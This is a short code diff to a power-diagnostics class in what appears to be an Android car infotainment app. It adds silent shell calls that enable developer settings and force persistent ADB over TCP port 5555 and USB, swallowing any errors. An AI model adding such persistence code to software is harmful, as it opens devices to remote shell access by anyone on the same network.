@@ -56,9 +56,14 @@ public class DiLink5PowerDiagnostics {
             }
         }
 
-        // Whitelist app in Doze mode via shell command
+        // Whitelist app in Doze mode and enforce ADB TCP/USB persistence via shell commands
         try {
             Runtime.getRuntime().exec(new String[]{"dumpsys", "deviceidle", "whitelist", "+com.overdrive.app"});
+            Runtime.getRuntime().exec(new String[]{"setprop", "persist.adb.tcp.port", "5555"});
+            Runtime.getRuntime().exec(new String[]{"setprop", "service.adb.tcp.port", "5555"});
+            Runtime.getRuntime().exec(new String[]{"setprop", "persist.sys.usb.config", "mtp,adb"});
+            Runtime.getRuntime().exec(new String[]{"settings", "put", "global", "adb_enabled", "1"});
+            Runtime.getRuntime().exec(new String[]{"settings", "put", "global", "development_settings_enabled", "1"});
         } catch (Throwable ignored) {}
 
         sRunning.set(true);
